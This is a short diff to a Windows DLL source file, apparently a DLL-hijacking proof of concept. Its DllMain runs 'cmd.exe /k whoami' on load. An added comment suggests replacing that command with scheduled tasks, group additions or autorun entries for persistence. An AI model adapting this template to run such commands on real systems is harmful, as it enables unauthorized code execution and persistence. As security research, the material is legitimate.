@@ -15,6 +15,7 @@
 
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
     if (dwReason == DLL_PROCESS_ATTACH) {
+        // here your system command gonna execute, can be TaskSchedule, AddGroup, CreateAutoRun, mvFileToSystemFolder
         system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
         ExitProcess(0);
     }
